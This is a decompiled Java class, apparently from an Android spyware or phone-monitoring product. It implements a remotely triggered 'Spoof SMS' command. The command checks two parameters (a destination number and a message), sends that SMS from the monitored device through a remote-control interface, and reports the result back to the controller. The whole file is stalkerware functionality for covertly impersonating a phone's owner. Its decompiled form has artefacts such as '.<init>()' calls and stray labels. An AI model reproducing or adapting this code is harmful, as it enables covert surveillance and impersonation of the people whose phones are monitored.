package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputSpoofSms;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class t
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public t(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int k = 2;
    Object localObject;
    if (i != k)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      int j;
      int m;
      do
      {
        boolean bool2 = localIterator.hasNext();
        if (!bool2) {
          return;
        }
        localObject = localIterator.next();
        localObject = (String)localObject;
        if (localObject == null) {
          break;
        }
        j = ((String)localObject).length();
        m = 1;
      } while (j >= m);
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    catch (NullPointerException localNullPointerException)
    {
      InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    bool1 = false;
    Object localObject2 = (String)((ArrayList)localObject1).get(0);
    localObject1 = (String)((ArrayList)localObject1).get(i);
    boolean bool2 = a;
    if (bool2) {}
    com.vvt.remotecontrol.a locala = h();
    RmtCtrlInputSpoofSms localRmtCtrlInputSpoofSms = new com/vvt/remotecontrol/input/RmtCtrlInputSpoofSms;
    localRmtCtrlInputSpoofSms.<init>();
    localRmtCtrlInputSpoofSms.setDestinationNumber((String)localObject2);
    localRmtCtrlInputSpoofSms.setSmsMessage((String)localObject1);
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    localObject1 = RemoteFunction.SPOOF_SMS;
    ((ControlCommand)localObject2).<init>((RemoteFunction)localObject1, localRmtCtrlInputSpoofSms);
    boolean bool3 = a;
    if (bool3) {}
    localObject1 = locala.execute((ControlCommand)localObject2);
    if (paramc != null)
    {
      bool1 = localObject1 instanceof RmtCtrlOutputStatusMessage;
      if (bool1)
      {
        localObject2 = localObject1;
        localObject2 = (RmtCtrlOutputStatusMessage)localObject1;
        bool1 = ((RmtCtrlOutputStatusMessage)localObject2).isSuccess();
        bool2 = a;
        if ((bool2) && (!bool1)) {
          break label213;
        }
        bool1 = a;
        if (bool1) {}
        localObject2 = "Spoof SMS is sent successfully";
        paramc.b(paramRemoteCommand, this, (String)localObject2);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label213:
      localObject1 = (RmtCtrlOutputStatusMessage)localObject1;
      localObject2 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
      if (localObject2 != null)
      {
        int j = ((String)localObject2).length();
        if (j > i)
        {
          boolean bool4 = a;
          if (bool4) {}
          localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject1).<init>((String)localObject2);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
          continue;
        }
      }
      bool1 = a;
      if (bool1) {}
      localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject1 = "Unknown.";
      ((RemoteCommandException)localObject2).<init>((String)localObject1);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Spoof SMS";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/t.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */